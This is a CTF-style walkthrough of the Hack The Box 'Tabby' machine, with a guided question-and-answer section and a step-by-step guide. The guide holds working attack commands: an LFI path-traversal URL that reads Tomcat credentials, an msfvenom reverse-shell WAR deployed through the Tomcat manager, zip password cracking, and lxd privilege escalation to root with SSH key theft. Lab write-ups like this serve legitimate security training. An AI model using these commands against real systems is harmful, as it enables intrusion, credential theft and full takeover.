# Hack The Box

## Tabby (Guided Mode)

### Guided mode

Q. How many TCP ports are open on the remote host?
```A. 3```
![image](https://github.com/brownPineapple/hackthebox/assets/30342446/6c76be3c-5b07-4dbb-885d-8259e0fc7d8e)

Q. What application is running on TCP 8080? (One word)
```A. Tomcat```

Q. Which link leads to the page containing the statement on recovering from the data breach?
```A. http://megahosting.htb/news.php?file=statement```
![image](https://github.com/brownPineapple/hackthebox/assets/30342446/430bfdda-cfcd-401d-a342-ab1f48460e0f)

Q. Which URL parameter of the ```news.php``` page is vulnerable to Local File Inclusion?
```A. file```

Q. Which system user has user id 1000 on Tabby?
```A. ash```

Q. What is the full path of Apache Tomcat's configuration file which contains a list of user names, roles, and passwords.
```A. /usr/share/tomcat9/etc/tomcat-users.xml```

Q. What is the password of the Apache Tomcat user ```tomcat```?
```A. $3cureP4s5w0rd123!```
![image](https://github.com/brownPineapple/hackthebox/assets/30342446/0cab503c-521e-4941-ae80-7b37ed41993b)

Q. What is the path on the webserver that leads to the text interface of the Host Manager app of Apache Tomcat?
```A. /manager/text```
![image](https://github.com/brownPineapple/hackthebox/assets/30342446/15e79cf5-97a5-4fdf-a332-89d301660b0a)

Q. Which command is used in the text interface of the Host Manager app of Apache Tomcat to deploy a new application archive (WAR) remotely?
```A. deploy```
![image](https://github.com/brownPineapple/hackthebox/assets/30342446/44556790-5b5a-4656-ab98-9547c08e3b89)

Q. What is the password for the file 16162020_backup.zip?
```A. admin@it```
![image](https://github.com/brownPineapple/hackthebox/assets/30342446/2633972e-d5ee-46f7-98d6-8773eb99d579)

Q. Which interesting user group is the user ash a member of?
```A. lxd```
![image](https://github.com/brownPineapple/hackthebox/assets/30342446/abb5c59d-cab3-429d-84b5-5223bde8a55b)

> https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation

Q. What is the command for listing the VM images present in lxd?
```A. lxc image list```
![image](https://github.com/brownPineapple/hackthebox/assets/30342446/fc1e833b-2e51-4e0e-bbc9-24f8e0be91c3)

Q. Which flag needs to be set as true in the lxc init command in order to force the container to interact as root with the host filesystem?
```A. security.privileged```
![image](https://github.com/brownPineapple/hackthebox/assets/30342446/e57aa73e-45e2-4dcc-9fb2-a675aca0f6dd)

### Step by step guide

1. We start with an nmap scan and discover http server running on port 80 and tomcat running on port 8080
2. Checking the website we discover a LFI vulnerability on news.php?file=**statement**
3. We can exploit this LFI vulnerability to read the tomcat configuration - ```http://megahosting.htb/news.php?file=../../../../../usr/share/tomcat9/etc/tomcat-users.xml```
4. The above url returns a blank webpage, but if we check source, we can see the xml file with the tomcat manager password
5. We can now go to megahosting.htb:8080/manager/ and login using the password found in the ```tomcat-users.xml``` file
6. The tomcat manager can use curl to interact with the tomcat interface
7. We run wfuzz or ffuf on /manager/FUZZ and check what options we have and we get ```text``` which can be exploited to get command execution
8. Now when we run ```curl -u tomcat:'$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/list``` to check if the command works and we get the list
9. We generate a payload using ```msfvenom -p java/shell_reverse_tcp lhost=x.x.x.x lport=xxxx -f war -o webshell.war```
10. We can now upload the payload and get code execution ```curl -u tomcat:'$3cureP4s5w0rd123!' -T webshell.war http://10.10.10.194:8080/manager/text/deploy?path=/webshell&update=true```
11. We are logged on as tomcat and we need to get to user ash
12. We found a zip file under /var/www/html/files/, we transfer the file to our local machine, but the file is password protected
13. Try to crack the password using fcrackzip - ```fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup.zip```
14. Now that we have the password we use ```su ash``` and enter the password, we are now user and can read ```/home/ash/user.txt```
15. Privilege escalation tip no 1, run the following commands before running any automated scipts like Linpeas - ```id, uname -a, lsb_release, sudo -l```
16. We find that user ash is a part of the lxd group, which is a tool used for running containers and virtual machines.
17. We can use the Method 2 in - ```https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation```
18. After followin the steps and running the final command - ```lxc exec mycontainer /bin/sh```
19. We are now root. We can goto ```/mnt/root/root/.ssh/``` and copy the private key on our machine and save it as root.key
20. We do ```chmod 600 root.key``` and ```ssh -i root.key root@megahosting.htb``` and **PWNED**.
